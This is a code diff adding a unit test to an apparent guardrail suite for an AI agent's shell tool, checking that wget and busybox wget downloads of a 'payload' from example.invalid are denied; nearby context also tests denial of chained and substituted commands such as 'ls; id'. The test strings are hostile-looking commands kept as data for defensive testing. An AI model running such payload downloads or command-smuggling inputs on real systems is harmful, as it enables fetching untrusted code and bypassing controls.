@@ -113,6 +113,20 @@ class ProtectedToolGuardrailTests(unittest.TestCase):
             )
         self.assertFalse(marker.exists())
 
+    def test_denies_wget_and_busybox_wget(self):
+        commands = (
+            "wget https://example.invalid/payload",
+            "busybox wget https://example.invalid/payload",
+            "/bin/busybox wget https://example.invalid/payload",
+        )
+
+        for command in commands:
+            with self.subTest(command=command):
+                with self.assertRaises(agent.GuardrailDenied):
+                    agent.execute_tool(
+                        "shell_execute", {"command": command}
+                    )
+
     def test_denies_shell_chaining_and_substitution(self):
         for command in ("ls; id", "ls $(id)", "ls > /tmp/listing", "ls\nid"):
             with self.subTest(command=command):
